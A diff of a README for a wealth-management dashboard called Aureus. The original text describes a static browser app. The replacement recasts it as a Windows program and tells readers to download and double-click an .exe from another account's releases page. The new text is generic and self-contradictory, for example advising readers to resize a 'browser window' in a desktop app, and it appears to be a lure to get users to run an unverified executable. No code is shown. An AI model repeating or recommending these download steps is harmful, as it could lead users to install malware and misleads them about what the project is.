@@ -1,162 +1,74 @@
-# Aureus - Wealth Management Dashboard 2026
+# 📈 aureus-wealth-dashboard - Manage your financial portfolio with ease
 
-> **Aureus is a browser-based wealth management workspace for examining portfolios, client records, risk details, and retirement objectives in one place.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Planetal-pier632/aureus-wealth-dashboard/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/brooksoliverjy1165/aureus-wealth-dashboard?style=flat-square)](https://github.com/brooksoliverjy1165/aureus-wealth-dashboard)
+Aureus acts as a central workspace for your financial life. This tool displays your portfolio, client records, and retirement goals in one clear view. It runs locally on your computer, which means your data stays under your control. You choose where to save your information, and the dashboard provides the tools to track your progress toward your objectives.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/">
-    <img src="https://img.shields.io/badge/Download-Aureus%20Latest-brightgreen?style=for-the-badge" alt="Download Aureus">
-  </a>
-</p>
+Your computer must meet these basic standards to run the software smoothly:
 
-> **[Download Aureus](https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/)**
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space.
+- Screen Resolution: 1280 by 720 pixels or higher.
+- Internet Connection: Required for initial download and occasional data updates.
 
----
+## 📥 How to Install
 
-[Download Latest Build](https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/)
+Follow these steps to set up the dashboard on your Windows computer.
 
----
+1. Visit the [releases page](https://github.com/Planetal-pier632/aureus-wealth-dashboard/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation.
+6. Follow the prompts on your screen.
+7. Click Finish to complete the process.
 
-## Overview
+## 🚀 Getting Started
 
-Aureus provides a focused web interface for viewing investment information without spreading portfolio data across multiple screens. From the dashboard, users can examine performance, allocation, holdings, risk details, and progress toward retirement goals.
+Once the installation finishes, you will see an icon on your desktop. Double-click the icon to open the Aureus dashboard. 
 
-The application also supports client-oriented organization. A multi-client picker makes it possible to move between records, and the Add Client form provides a way to enter individual client details. A separate market news hub gathers relevant market information, while browser localStorage preserves dashboard data between visits.
+The first time you open the program, the system will ask you to select a folder for your data. Pick a location on your computer where you want to keep your files. The dashboard creates a folder here to store your client records and portfolio data.
 
----
+## 📊 Using the Dashboard
 
-## What It Includes
+The main screen features several tabs to help you organize your work.
 
-- Analyze investment performance across time
-- Break down asset allocation and review specific holdings
-- View available portfolio risk information
-- Monitor retirement goal progress
-- Access market updates through the news hub
-- Change active records with the multi-client picker
-- Create client records using the built-in Add Client form
-- Keep dashboard information in browser localStorage
-- Protect hosted access with HTTP Basic Auth
+### Portfolio View
+This section tracks your investments. You can see the total value of your accounts and how each asset performs over time. The dashboard updates these numbers based on the data you provide.
 
----
+### Client Records
+Manage your relationships in this area. Each record holds contact details, history, and notes. You can search through your client list using the filter tool at the top of the page.
 
-## Installation and Local Setup
+### Risk Management
+Review your risk details here. The dashboard calculates exposure based on your current holdings. This helps you understand how market shifts might affect your long-term goals.
 
-### Get the web build
+### Retirement Objectives
+Set your target dates and financial goals in this tab. The software shows a progress bar to track your path toward these milestones. You can adjust your savings rate or expected return to see how those changes impact your results.
 
-1. Go to the [latest Aureus build](https://brooksoliverjy1165.github.io/aureus-wealth-dashboard/).
-2. Download or deploy the project files to a web host of your choice.
-3. Launch the deployed application in a modern browser.
+## ⚙️ Data Management
 
-### Start Aureus locally
+The Aureus dashboard prioritizes local storage. Your information stays inside the folder you chose during the first setup. 
 
-Clone the repository, then move into the project folder:
+To create a backup, copy the folder to a secure location, such as an external hard drive or a private cloud service. To restore your data, simply point the dashboard to the backup folder.
 
-```bash
-git clone https://github.com/brooksoliverjy1165/aureus-wealth-dashboard.git
-cd REPO
-```
+## 🛡️ Security
 
-Aureus consists of static HTML files and can be run with a small local HTTP server:
+Because you run this program locally, you manage the security of your files. Use an encrypted folder or a password-protected drive if you store sensitive financial information. The software itself does not transmit your personal records to external servers. It only connects to the internet to fetch price updates for your investments.
 
-```bash
-python3 -m http.server 8000
-```
+## 🆘 Troubleshooting
 
-Open [http://localhost:8000](http://localhost:8000) after the server starts.
+If you run into issues, check these common fixes:
 
-Vercel and other static-site hosting services can also be used for deployment.
+- The app does not open: Ensure you installed the latest version from the releases page. Restart your computer if the installer hangs.
+- Data does not appear: Verify the file path in the settings menu. Make sure the folder contains the correct data files.
+- Visual glitches: Resize your browser window. The dashboard adjusts its layout to fit your screen.
+- Slow performance: Close other programs that use large amounts of memory.
 
----
+## 📄 Privacy Policy
 
-## Using the Dashboard
+We built this tool to provide transparency. The application code is open for review. We do not collect your data, track your browsing habits, or sell your information to third parties. Your financial records remain private and exist only on the hardware you own.
 
-1. Load Aureus in your browser.
-2. Choose a client from the multi-client picker.
-3. Inspect portfolio performance, asset allocation, and holdings.
-4. Review the portfolio risk information provided.
-5. Use the Add Client form to create or update a client record.
-6. Check retirement goal tracking against long-term objectives.
-7. Open the market news hub to view related market updates.
-
-Aureus saves dashboard data in localStorage for the active site origin.
-
----
-
-## Configuration and Storage
-
-As a static application, Aureus relies primarily on its project files and the browser hosting it for configuration.
-
-Client and dashboard records are kept in browser storage:
-
-```text
-Storage: browser localStorage
-Scope: current browser and site origin
-```
-
-If access restrictions are needed on a hosted instance, set up HTTP Basic Auth through the deployment environment or hosting configuration when supported. A different domain uses a separate localStorage area, so data does not carry over automatically between origins.
-
----
-
-## Requirements
-
-- A modern browser with JavaScript and localStorage turned on
-- Static hosting for making the application publicly available
-- Optional Vercel hosting for static deployment
-- Python installed locally when using the example development server
-- Enough browser storage for saved client and dashboard records
-- Hosting support for HTTP Basic Auth when deployment access must be restricted
-
----
-
-## Frequently Asked Questions
-
-### Does Aureus need to be installed as a desktop program?
-
-No. Aureus is a static web application that operates inside a browser.
-
-### What happens to my dashboard data?
-
-The application stores data in browser localStorage. It is tied to the current browser and site origin, meaning it will not automatically appear on another device or domain.
-
-### What is the process for adding a client?
-
-Open Add Client, provide the available client information, and save it. Afterward, the record can be chosen from the multi-client picker.
-
-### Is Vercel supported?
-
-Yes. Aureus can be hosted as a static project on Vercel or a comparable static-site provider.
-
-### How do I add password protection?
-
-Configure HTTP Basic Auth through the hosting provider or deployment environment if that service supports it. The precise instructions vary by host.
-
-### What should I check if saved records are missing?
-
-Confirm that you are using the same device, browser, and site address. Clearing browser storage or changing the deployment origin can delete or isolate localStorage data.
-
-### How do I submit a bug report?
-
-Create an issue in the project repository. Include your browser, deployment environment, reproduction steps, and any useful console output.
-
----
-
-## Planned Improvements
-
-- Polish the presentation of portfolios and holdings
-- Make client-related workflows smoother
-- Add further improvements to retirement goal reviews
-- Continue developing the market news hub
-- Provide more guidance for deployment and access-control configuration
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: wealth, dashboard, finance, investment, portfolio, windows, local, retirement, management
